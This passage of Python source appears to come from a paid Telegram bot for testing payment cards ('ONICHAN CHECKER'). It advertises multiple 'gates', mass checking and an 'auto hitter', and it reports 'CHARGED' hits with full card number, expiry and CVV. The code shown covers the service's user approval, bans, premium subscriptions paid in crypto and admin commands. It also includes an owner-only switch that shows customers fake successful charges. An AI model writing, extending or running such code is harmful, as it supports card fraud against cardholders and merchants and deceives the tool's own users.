            f"{sep}\n"
            f"🔢 <b>BIN</b>      : {bin6}\n"
            f"💠 <b>Network</b>  : {brand}\n"
            f"🏦 <b>Bank</b>     : {bank}\n"
            f"🌍 <b>Country</b>  : {country_name} {country_flag}\n"
            f"🔗 <b>Merchant</b> : {merchant} — {amount_str}\n"
            f"{sep}\n"
            f"⏱ <b>Time</b>     : {check_time:.2f}s\n"
            f"⚡ <b>Powered</b>  : @{SUPPORT_USERNAME}"
        )

        hit_msg = ae(hit_msg)
        gif_url = get_sexy_anime_gif("success")

        await bot.send_animation(
            chat_id=user_id,
            animation=gif_url,
            caption=hit_msg,
            parse_mode=ParseMode.HTML
        )
        return True
    except Exception as e:
        print(f"Error sending hit to user PM: {e}")
        try:
            await bot.send_message(
                chat_id=user_id,
                text=(
                    f"{EMOJI['charged']} <b>HIT!</b>\n\n"
                    f"💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                    f"✅ CHARGED {sym}{float(price) if price else 0:.2f} {currency}"
                ),
                parse_mode=ParseMode.HTML
            )
        except:
            pass
        return False

# ============================================================================
# ACCESS CONTROL DECORATOR
# ============================================================================

def require_approval(func):
    """Decorator to require user approval"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        # Check if banned
        if is_banned(user.id):
            gif_url = get_sexy_anime_gif("banned")
            await update.message.reply_animation(
                animation=gif_url,
                caption=ae("🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot."),
                parse_mode=ParseMode.HTML
            )
            return
        
        # Check if approved
        if not is_approved(user.id):
            # Add to pending
            add_to_pending(user.id, user.username, user.first_name)
            
            # Notify owner
            if OWNER_ID > 0:
                try:
                    await context.bot.send_message(
                        chat_id=OWNER_ID,
                        text=f"🔔 <b>New User Request</b>\n\n"
                             f"👤 Name: {user.first_name}\n"
                             f"🆔 ID: <code>{user.id}</code>\n"
                             f"👤 Username: @{user.username or 'None'}\n\n"
                             f"Use /approve {user.id} to approve",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass
            
            await update.message.reply_text(
                "⏳ <b>Access Pending</b>\n\n"
                "Your request has been sent to the owner.\n"
                "Please wait for approval.\n\n"
                f"Contact: @{SUPPORT_USERNAME}",
                parse_mode=ParseMode.HTML
            )
            return
        
        return await func(update, context)
    return wrapper

def get_premium_denied_message(user_id):
    """Get the appropriate premium denied message based on status"""
    status = check_premium_status(user_id)
    if status == "expired":
        return ("⚠️ <b>PREMIUM EXPIRED!</b>\n\n"
                "Your premium subscription has expired.\n"
                "Renew now to continue using premium features.\n\n"
                "💎 Use /premium to renew your subscription.")
    else:
        return ("💎 <b>PREMIUM REQUIRED!</b>\n\n"
                "This feature requires premium access.\n\n"
                f"💎 Use /premium to get premium access.\n"
                f"📞 Contact: @{SUPPORT_USERNAME}")

def require_premium(func):
    """Decorator to require premium access"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        
        if not is_premium(user.id):
            gif_url = get_sexy_anime_gif("premium")
            msg = get_premium_denied_message(user.id)
            await update.message.reply_animation(
                animation=gif_url,
                caption=msg,
                parse_mode=ParseMode.HTML
            )
            return
        
        return await func(update, context)
    return wrapper


# ============================================================================
# START COMMAND
# ============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - No approval required for start"""
    from modules.database import get_user_check_stats
    user = update.effective_user
    
    # Check if banned
    if is_banned(user.id):
        gif_url = get_sexy_anime_gif("banned")
        await update.message.reply_animation(
            animation=gif_url,
            caption=ae("🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot."),
            parse_mode=ParseMode.HTML
        )
        return
    
    rank = get_user_rank(user.id)
    
    # Get user stats
    stats = get_user_check_stats(user.id)
    total_checks = stats.get('total', 0)
    approved = stats.get('approved', 0)
    declined = stats.get('declined', 0)
    success_rate = stats.get('success_rate', 0)
    first_check = stats.get('first_check')
    
    # Format join date
    if first_check:
        join_date = first_check.strftime("%b %d, %Y")
    else:
        join_date = "New User"
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN CHECKER</b>
{sep}
🌸 <b>Hii {user.first_name}!</b>
{sep}
👑 <b>Status</b>   : {rank}
🆔 <b>ID</b>       : <code>{user.id}</code>
📅 <b>Since</b>    : {join_date}
💳 <b>Checks</b>   : {total_checks:,}
✅ <b>Approved</b> : {approved:,}
❌ <b>Declined</b> : {declined:,}
📈 <b>Rate</b>     : {success_rate}%
{sep}
⚡ 21 Gates | 📋 Mass Check | 🎯 Auto Hitter
🔮 Proxy | 📱 Temp Phone | 🧚 AI Chat
{sep}
💎 <b>Premium</b> : $3/w · $5/2w · $10/m · $25/3m
{sep}""")
    
    keyboard = [
        [
            _btn("Gates", style="danger", icon=EID["live"], callback_data="gates"),
            _btn("Tools", style="success", icon=EID["bolt"], callback_data="tools")
        ],
        [
            _btn("Premium", style="success", icon=EID["crown"], callback_data="premium"),
            _btn("Stats", style="danger", icon=EID["stats"], callback_data="info")
        ]
    ]
    
    if is_owner(user.id):
        keyboard.append([
            _btn("Help", style="default", icon=EID["question"], callback_data="help_menu"),
            _btn("Admin", style="primary", icon=EID["crown"], callback_data="admin")
        ])
    else:
        keyboard.append([
            _btn("Help", style="default", icon=EID["question"], callback_data="help_menu"),
            _btn("Channel", style="primary", icon=EID["broadcast"], url=f"https://t.me/{CHANNEL_USERNAME}")
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send welcome message WITH GIF
    try:
        welcome_gif = get_sexy_anime_gif("welcome")
        if welcome_gif:
            await update.message.reply_animation(
                animation=welcome_gif, caption=text,
                parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        else:
            await update.message.reply_text(
                text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
    except Exception as e:
        logger.warning(f"Start command fallback triggered: {e}")
        try:
            await update.message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        except:
            await update.message.reply_text("Welcome! Send /help for commands")

# ============================================================================
# ADMIN PANEL (OWNER ONLY)
# ============================================================================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel - Owner only"""
    query = update.callback_query
    user = query.from_user
    
    if not is_owner(user.id):
        await query.answer(ae("❌ Owner only!"), show_alert=True)
        return
    
    await query.answer()
    
    # Get stats
    try:
        with open(DB_OWNER, 'r') as f:
            owners_count = len([l for l in f if l.strip()])
        with open(DB_PREMIUM, 'r') as f:
            premium_count = len([l for l in f if l.strip()])
        with open(DB_FREE, 'r') as f:
            free_count = len([l for l in f if l.strip()])
        with open(DB_BANNED, 'r') as f:
            banned_count = len([l for l in f if l.strip()])
        with open(DB_PENDING, 'r') as f:
            pending_count = len([l for l in f if l.strip()])
    except:
        owners_count = premium_count = free_count = banned_count = pending_count = 0
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • ADMIN</b>
{sep}
👑 <b>Owners</b>   : {owners_count}
💎 <b>Premium</b>  : {premium_count}
🆓 <b>Free</b>     : {free_count}
⏳ <b>Pending</b>  : {pending_count}
🚫 <b>Banned</b>   : {banned_count}
{sep}
/approve · /premium · /ban · /unban
/broadcast · /stats · /pending
{sep}
🤖 @{BOT_USERNAME} | 👑 @{OWNER_USERNAME}""")
    
    keyboard = [
        [_btn("All Users", style="primary", icon=EID["users"], callback_data="admin_users")],
        [
            _btn("Premium", style="success", icon=EID["crown"], callback_data="admin_premium"),
            _btn("Free", style="success", icon=EID["free"], callback_data="admin_free")
        ],
        [
            _btn("Pending", style="primary", icon=EID["hitting"], callback_data="admin_pending"),
            _btn("Banned", style="danger", icon=EID["blocked"], callback_data="admin_banned")
        ],
        [_btn("Admins", style="primary", icon=EID["crown"], callback_data="admin_admins")],
        [_btn("Statistics", style="success", icon=EID["stats"], callback_data="admin_stats")],
        [_btn("Settings", style="primary", icon=EID["lock"], callback_data="admin_settings")],
        [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    gif_url = get_sexy_anime_gif("admin")
    
    await query.message.reply_animation(
        animation=gif_url,
        caption=text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    await query.message.delete()

# ============================================================================
# ADMIN COMMANDS
# ============================================================================

async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Approve a user - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "✅ <b>Approve User</b>\n\n"
            "<b>Usage:</b> <code>/approve &lt;user_id&gt;</code>\n\n"
            "<b>Example:</b> <code>/approve 123456789</code>\n\n"
            "Grants the user access to use the bot.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        # Add to free users
        with open(DB_FREE, 'a') as f:
            f.write(f"{target_id}\n")
        invalidate_user_cache(target_id)  # flush permission cache

        # Remove from pending
        try:
            with open(DB_PENDING, 'r') as f:
                lines = f.readlines()
            with open(DB_PENDING, 'w') as f:
                for line in lines:
                    if not line.startswith(str(target_id)):
                        f.write(line)
        except:
            pass
        
        await update.message.reply_text(ae(f"✅ User {target_id} approved!"))
        
        # Notify user
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=ae("✅ <b>Access Approved!</b>\n\nYou can now use the bot.\nSend /start to begin!"),
                parse_mode=ParseMode.HTML
            )
        except:
            pass
            
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def rspfakeon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enable fake auto hitter success mode - Owner only"""
    global FAKE_AUTOHITTER_MODE
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    FAKE_AUTOHITTER_MODE = True
    await update.message.reply_text(
        "✅ <b>Fake Auto Hitter Mode: ON</b>\n\n"
        "All /co commands will now show fake successful payment responses.\n"
        "Use /rspfakeoff to disable.",
        parse_mode=ParseMode.HTML
    )

async def rspfakeoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Disable fake auto hitter success mode - Owner only"""
    global FAKE_AUTOHITTER_MODE
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    FAKE_AUTOHITTER_MODE = False
    await update.message.reply_text(
        "❌ <b>Fake Auto Hitter Mode: OFF</b>\n\n"
        "All /co commands will now show real responses.",
        parse_mode=ParseMode.HTML
    )

async def give_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Give premium access with invoice - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "⭐ <b>Give Premium</b>\n\n"
            "<b>Usage:</b> <code>/premium &lt;user_id&gt; &lt;plan&gt;</code>\n\n"
            "<b>Arguments:</b>\n"
            "• <code>user_id</code> — Telegram ID of the user\n"
            "• <code>plan</code> — One of: 1_week, 2_weeks, 1_month, 3_months\n\n"
            "<b>Example:</b>\n"
            "<code>/premium 123456789 1_month</code>\n\n"
            "👑 Owner only."
        )
        return
    
    try:
        target_id = int(context.args[0])
        plan_key = context.args[1]
        
        # Get plan info
        plan = get_plan_info(plan_key)
        if not plan:
            await update.message.reply_text(ae("❌ Invalid plan! Use: 1_week, 2_weeks, 1_month, 3_months"))
            return
        
        # Get target user info
        try:
            target_user = await context.bot.get_chat(target_id)
            target_username = target_user.username or target_user.first_name
        except:
            target_username = "User"
        
        # Generate invoice
        invoice_data = generate_invoice(target_id, target_username, plan_key, "Manual Payment")
        
        if not invoice_data:
            await update.message.reply_text(ae("❌ Error generating invoice!"))
            return
        
        # Add to premium - update PostgreSQL first
        from datetime import datetime, timedelta
        from modules.database import set_premium_sync, add_user_sync
        
        expiry = datetime.now() + timedelta(days=plan['duration_days'])
        expiry_str = expiry.strftime("%Y-%m-%d")
        
        # Ensure user exists and set premium in PostgreSQL
        add_user_sync(target_id, target_username, "approved")
        set_premium_sync(target_id, plan['duration_days'])
        invalidate_user_cache(target_id)  # flush permission cache immediately

        # Also write to local file as backup
        try:
            with open(DB_PREMIUM, 'a') as f:
                f.write(f"{target_id} {expiry_str}\n")
        except:
            pass
        
        # Send invoice to owner
        await update.message.reply_text(
            f"✅ <b>Premium Activated!</b>\n\n"
            f"User: {target_id}\n"
            f"Plan: {plan['name']}\n"
            f"Price: ${plan['price']}\n"
            f"Expires: {expiry_str}",
            parse_mode=ParseMode.HTML
        )
        
        # Send invoice to user
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=invoice_data['invoice'],
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
        except:
            pass
            
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def remove_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove premium from a user - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "⭐ <b>Remove Premium</b>\n\n"
            "<b>Usage:</b> <code>/rmpremium &lt;user_id&gt;</code>\n\n"
            "<b>Example:</b> <code>/rmpremium 123456789</code>\n\n"
            "Revokes premium access from the user immediately.\n"
            "👑 Owner only.",
            parse_mode=ParseMode.HTML,
        )
        return
    
    try:
        target_id = int(context.args[0])
        
        from modules.database import remove_premium_sync
        
        result = remove_premium_sync(target_id)
        invalidate_user_cache(target_id)  # flush permission cache

        if result:
            await update.message.reply_text(
                f"✅ <b>Premium Removed!</b>\n\n"
                f"User: <code>{target_id}</code>\n"
                f"Status: Free user now",
                parse_mode=ParseMode.HTML
            )
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=ae("⚠️ <b>Premium Revoked</b>\n\n"
                         "Your premium subscription has been removed by the admin.\n"
                         "You no longer have access to premium features.\n\n"
                         "💎 Use /premium to renew your subscription."),
                    parse_mode=ParseMode.HTML
                )
            except Exception as notify_err:
                print(f"[Premium] Could not notify user {target_id}: {notify_err}")
        else:
            await update.message.reply_text(ae(f"❌ Failed to remove premium for user {target_id}"))
            
    except ValueError:
        await update.message.reply_text(ae("❌ Invalid user ID!"))
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check user subscription status"""
    user = update.effective_user
    
    if context.args and is_owner(user.id):
        try:
            target_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text(ae("❌ Invalid user ID!"))
            return
    else:
        target_id = user.id
    
    try:
        from modules.database import get_connection, is_db_connected
        from psycopg2.extras import RealDictCursor
        
        if not is_db_connected():
            await update.message.reply_text(ae("❌ Database not connected!"))
            return
        
        conn = get_connection()
        with conn.cursor(cursor_factory=RealDictCursor) as cur:
            cur.execute("""
                SELECT user_id, username, status, premium, premium_expiry, is_owner, created_at
                FROM users WHERE user_id = %s
            """, (target_id,))
            result = cur.fetchone()
        
        if not result:
            if target_id == 8119946836:
                await update.message.reply_text(
                    f"👤 <b>User Info</b>\n\n"
                    f"🆔 ID: <code>{target_id}</code>\n"
                    f"👑 Status: <b>Owner</b>\n"
                    f"💎 Premium: <b>Lifetime</b>\n"
                    f"📅 Expires: <b>Never</b>",
                    parse_mode=ParseMode.HTML
                )
            else:
                await update.message.reply_text(ae(f"❌ User {target_id} not found in database!"))
            return
        
        status_emoji = "👑" if result.get("is_owner") else ("✅" if result.get("status") == "approved" else "⏳")
        premium_status = "Lifetime" if result.get("is_owner") else ("Active" if result.get("premium") else "None")
        
        expiry_text = "Never"
        if result.get("premium_expiry") and not result.get("is_owner"):
            expiry = result["premium_expiry"]
            if hasattr(expiry, 'strftime'):
                expiry_text = expiry.strftime("%Y-%m-%d %H:%M")
            else:
                expiry_text = str(expiry)[:16]
        
        role = "Owner" if result.get("is_owner") else ("Premium" if result.get("premium") else "Free")
        
        await update.message.reply_text(
            f"👤 <b>User Info</b>\n\n"
            f"🆔 ID: <code>{result['user_id']}</code>\n"
            f"📛 Username: @{result.get('username') or 'N/A'}\n"
            f"{status_emoji} Status: <b>{result.get('status', 'pending').title()}</b>\n"
            f"💎 Premium: <b>{premium_status}</b>\n"
            f"📅 Expires: <b>{expiry_text}</b>\n"
            f"🎭 Role: <b>{role}</b>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def show_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show premium plans"""
    plans = get_all_plans()
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • PLANS</b>
{sep}
""")
    
    for plan_key, plan in plans.items():
        text += f"📦 <b>{plan['name']}</b> — {plan['currency']}{plan['price']} ({plan['duration_days']}d)\n"
    
    text += f"""{sep}
💳 Crypto · PayPal · Bank Transfer
📞 @tu_bkl_hai | 📢 @krishnaslounge"""
    
    keyboard = [
        [_btn("Contact Owner", icon=EID["users"], url="https://t.me/tu_bkl_hai")],
        [_btn("Join Channel", icon=EID["broadcast"], url="https://t.me/krishnaslounge")],
        [_btn("BACK", style="default", icon=EID["back"], callback_data="start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

# ============================================================================
# CRYPTO PAYMENT COMMANDS
# ============================================================================

def get_payment_settings():
    """Get payment settings from settings file"""
    from config import DB_SETTINGS
    settings = {
        'payment_mode': 'crypto',
        'manual_payment_info': 'Contact @tu_bkl_hai for manual payment',
        'manual_payment_address': '',
        'manual_payment_instructions': ''
    }
    try:
        with open(DB_SETTINGS, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if '=' in line:
                    key, value = line.split('=', 1)
                    settings[key.strip()] = value.strip()
    except:
        pass
    return settings


STARS_PLANS = {
    "1_week": {"name": "1 Week Premium", "duration_days": 7, "stars": 150},
    "2_weeks": {"name": "2 Weeks Premium", "duration_days": 14, "stars": 250},
    "1_month": {"name": "1 Month Premium", "duration_days": 30, "stars": 500},
    "3_months": {"name": "3 Months Premium", "duration_days": 90, "stars": 1250}
}

TON_PLANS = {
    "1_week":   {"name": "1 Week Premium",   "duration_days": 7,  "ton": "0.6"},
    "2_weeks":  {"name": "2 Weeks Premium",  "duration_days": 14, "ton": "1.0"},
    "1_month":  {"name": "1 Month Premium",  "duration_days": 30, "ton": "2.0"},
    "3_months": {"name": "3 Months Premium", "duration_days": 90, "ton": "5.0"},
}

# Awaiting tx-hash from user: user_id -> {"plan_key": ..., "ton": ..., "name": ...}
_pending_ton_submissions: dict = {}


async def handle_pre_checkout(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle pre-checkout query for Telegram Stars payments"""
    query = update.pre_checkout_query
    
    try:
        payload = query.invoice_payload
        
        if not payload.startswith("premium_"):
            await query.answer(ok=False, error_message="Invalid payment payload")
            return
        
        await query.answer(ok=True)
        print(f"[Stars] Pre-checkout approved: {payload}")
        
    except Exception as e:
        print(f"[Stars] Pre-checkout error: {e}")
        await query.answer(ok=False, error_message="Payment error. Please try again.")


async def handle_successful_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle successful Telegram Stars payment"""
    message = update.message
    payment = message.successful_payment
    user = message.from_user
    
    try:
        payload = payment.invoice_payload
        charge_id = payment.telegram_payment_charge_id
        total_amount = payment.total_amount
        
        print(f"[Stars] Payment received: {payload}, {total_amount} XTR, charge: {charge_id}")
        
        if not payload.startswith("premium_"):
            await message.reply_text(ae("❌ Invalid payment. Contact support."))
            return
        
        parts = payload.split("_")
        if len(parts) >= 3:
            plan_key = f"{parts[1]}_{parts[2]}"
        else:
            plan_key = "1_week"
        
        plan = STARS_PLANS.get(plan_key, STARS_PLANS["1_week"])
        
        from datetime import timedelta
        expiry = datetime.now() + timedelta(days=plan["duration_days"])
        set_premium_sync(user.id, expiry)
        invalidate_user_cache(user.id)  # flush permission cache

        text = ae(f"""✅ <b>PAYMENT SUCCESSFUL!</b> ⭐

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan['name']}
💫 <b>Stars Paid:</b> {total_amount} ⭐
📅 <b>Expires:</b> {expiry.strftime('%Y-%m-%d')}

━━━━━━━━━━━━━━━━━━━━━━

🎉 <b>Your premium is now active!</b>
Enjoy all premium features!

📋 <b>Charge ID:</b> <code>{charge_id}</code>""")
        
        keyboard = [[_btn("Start Using", icon=EID["bolt"], callback_data="start")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        
        print(f"[Stars] Premium activated: User {user.id}, Plan: {plan_key}, Expiry: {expiry}")
        
    except Exception as e:
        print(f"[Stars] Payment processing error: {e}")
        import traceback
        traceback.print_exc()
        await message.reply_text(
            "✅ Payment received! If premium isn't active, contact support with your payment receipt."
        )

async def handle_ton_txhash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive a TON transaction hash from a user who just paid."""
    user = update.effective_user
    message = update.message
    text = (message.text or "").strip()

    pending = _pending_ton_submissions.get(user.id)
    if not pending:
        return  # Not waiting for a tx hash from this user

    tx_hash = text
    plan = pending["plan_key"]
    ton_amount = pending["ton"]
    plan_name = pending["name"]
    duration = pending["duration_days"]

    _pending_ton_submissions.pop(user.id, None)

    from config import OWNER_ID, TON_WALLET
    username_str = f"@{user.username}" if user.username else user.first_name

    # Confirm to user
    await message.reply_text(
        f"💎 <b>TON Payment Submitted!</b>\n\n"
        f"📦 <b>Plan:</b> {plan_name}\n"
        f"💎 <b>Amount:</b> {ton_amount} TON\n"
        f"🔗 <b>TX Hash:</b> <code>{html.escape(tx_hash)}</code>\n\n"
        f"⏳ Your payment is being verified by the owner.\n"
        f"You will receive premium access once confirmed.\n\n"
        f"💬 Contact @{SUPPORT_USERNAME} if you need help.",
        parse_mode=ParseMode.HTML
    )

    # Notify owner
    try:
        owner_text = (
            f"💎 <b>NEW TON PAYMENT SUBMITTED</b>\n\n"
            f"👤 User: {username_str} (<code>{user.id}</code>)\n"
            f"📦 Plan: {plan_name} ({duration} days)\n"
            f"💎 Amount: {ton_amount} TON\n"
            f"🔗 TX Hash: <code>{html.escape(tx_hash)}</code>\n\n"
            f"🔍 Verify: https://tonscan.org/tx/{html.escape(tx_hash)}\n\n"
            f"✅ To activate:\n"
            f"<code>/premium {user.id} {duration}</code>"
        )
        await context.bot.send_message(chat_id=OWNER_ID, text=owner_text, parse_mode=ParseMode.HTML)
    except Exception as e:
        print(f"[TON] Owner notify error: {e}")


async def buy_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Buy premium with CoinPayments - /buy [plan]"""
    user = update.effective_user
    
    if is_banned(user.id):
        await update.message.reply_text(ae("🚫 You are banned!"))
        return
    
    if not context.args:
        text = ae("""💰 <b>BUY PREMIUM WITH CRYPTO</b> 💰

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Available Plans:</b>

• <code>1_week</code> - $3 USD (7 days)
• <code>2_weeks</code> - $5 USD (14 days)
• <code>1_month</code> - $10 USD (30 days)
• <code>3_months</code> - $25 USD (90 days)

━━━━━━━━━━━━━━━━━━━━━━

<b>Usage:</b> <code>/buy [plan]</code>
<b>Example:</b> <code>/buy 1_month</code>

Or use the buttons below!

━━━━━━━━━━━━━━━━━━━━━━

🪙 <b>Accepts:</b> BTC, LTC, ETH, USDT, TRX, SOL & more!
✅ <b>Automatic Activation</b> - Premium activates on payment!""")
        
        keyboard = [
            [_btn("1 Week - $3", icon=EID["card"], callback_data="buy_1_week")],
            [_btn("2 Weeks - $5", icon=EID["card"], callback_data="buy_2_weeks")],
            [_btn("1 Month - $10", icon=EID["crown"], callback_data="buy_1_month")],
            [_btn("3 Months - $25", icon=EID["card"], callback_data="buy_3_months")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(text=text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
        return
    
    plan_key = context.args[0].lower()
    
    if plan_key not in CRYPTO_PLANS:
        await update.message.reply_text(
            "❌ <b>Invalid plan!</b>\n\n"
            "Available: <code>1_week</code>, <code>2_weeks</code>, <code>1_month</code>, <code>3_months</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    status_msg = await update.message.reply_text(ae("⏳ Creating payment invoice..."))
    
    import os
    domain = os.environ.get("REPLIT_DEPLOYMENT_URL") or os.environ.get("REPLIT_DEV_DOMAIN", "")
    if domain and not domain.startswith("http"):
        domain = f"https://{domain}"
    callback_url = f"{domain}/webhook/oxapay" if domain else None
    
    result = cp_create_order(
        user_id=user.id,
        username=user.username or user.first_name or "User",
        plan_key=plan_key,
        crypto="USDT",
        callback_url=callback_url
    )
    
    if result.get("error"):
        await status_msg.edit_text(
            f"❌ <b>Error creating order:</b>\n\n{result['error']}\n\n"
            f"Please try again or contact @{SUPPORT_USERNAME}.",
            parse_mode=ParseMode.HTML
        )
        return
    
    plan = result['plan']
    payment_url = result.get('payment_url', '')
    order_id = result.get('order_id', result.get('txn_id', ''))
    
    text = ae(f"""💳 <b>CRYPTO PAYMENT ORDER</b>

━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Plan:</b> {plan['name']}
💵 <b>Amount:</b> ${plan['price']} USD
⏰ <b>Duration:</b> {plan['duration_days']} days

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Order ID:</b> <code>{order_id}</code>

━━━━━━━━━━━━━━━━━━━━━━

Click the button below to pay!
🪙 Pay with BTC, LTC, ETH, USDT & more!
✅ Premium activates automatically!""")
    
    keyboard = []
    if payment_url:
        keyboard.append([_btn("Pay Now", icon=EID["card"], url=payment_url)])
    keyboard.append([_btn("Check Status", style="success", icon=EID["regenerate"], callback_data=f"check_payment_{order_id}")])
    keyboard.append([_btn("Support", style="default", icon=EID["users"], url=f"https://t.me/{SUPPORT_USERNAME}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await status_msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)


async def my_payments(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user's pending payments - /mypayments"""
    user = update.effective_user
    
    if is_banned(user.id):
        await update.message.reply_text(ae("🚫 You are banned!"))
        return
    
    pending = cp_get_pending(user_id=user.id)
    
    if not pending:
        await update.message.reply_text(
            "📭 <b>No Pending Payments</b>\n\n"
            "You have no pending payments.\n"
            "Use /buy to purchase premium.",
            parse_mode=ParseMode.HTML
        )
        return
    
    text = ae(f"""💳 <b>YOUR PENDING PAYMENTS</b>

━━━━━━━━━━━━━━━━━━━━━━

""")
    
    for i, txn in enumerate(pending[:5], 1):
        plan = CRYPTO_PLANS.get(txn.get('plan_key', ''), {})
        created = txn.get('created_at', txn.get('created', 'N/A'))
        text += f"""<b>#{i} - {plan.get('name', txn.get('plan_key', 'N/A'))}</b>
💵 Amount: ${txn.get('amount', 0)} USD
📅 Created: {str(created)[:19]}

"""
    
    text += """━━━━━━━━━━━━━━━━━━━━━━

📞 Contact owner with payment proof for activation!"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


async def check_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check payment status - /checkpayment"""
    user = update.effective_user
    
    if is_banned(user.id):
        await update.message.reply_text(ae("🚫 You are banned!"))
        return
    
    await update.message.reply_text(
        "💳 <b>Payment Verification</b>\n\n"
        "Payments are verified manually by the owner.\n\n"
        "📞 Contact @tu_bkl_hai with:\n"
        "• Your User ID\n"
        "• Payment screenshot\n"
        "• Plan purchased\n\n"
        "Premium will be activated within 5 minutes!",
        parse_mode=ParseMode.HTML
    )


async def admin_activate_crypto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Manually activate premium for crypto payment - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /cryptoactivate [user_id] [plan]\n\n"
            "Plans: 1_week, 2_weeks, 1_month, 3_months"
        )
        return
    
    try:
        target_id = int(context.args[0])
        plan_key = context.args[1].lower()
        
        if plan_key not in CRYPTO_PLANS:
            await update.message.reply_text(ae("❌ Invalid plan!"))
            return
        
        try:
            target_user = await context.bot.get_chat(target_id)
            target_username = target_user.username or target_user.first_name
        except:
            target_username = "User"
        
        result = cp_activate_premium(target_id, plan_key, target_username, "CoinPayments")
        
        if result:
            await update.message.reply_text(
                f"✅ <b>Premium Activated!</b>\n\n"
                f"User: {target_id}\n"
                f"Plan: {result['plan']}\n"
                f"Expires: {result['expiry']}",
                parse_mode=ParseMode.HTML
            )
            
            try:
                await context.bot.send_message(
                    chat_id=target_id,
                    text=ae(f"✅ <b>Premium Activated!</b>\n\n"
                         f"Your premium has been activated!\n"
                         f"Plan: {result['plan']}\n"
                         f"Expires: {result['expiry']}\n\n"
                         f"Enjoy your premium features!"),
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        else:
            await update.message.reply_text(ae("❌ Error activating premium!"))
            
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))


async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban a user - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "🚫 <b>Ban User</b>\n\n"
            "<b>Usage:</b> <code>/ban &lt;user_id&gt;</code>\n\n"
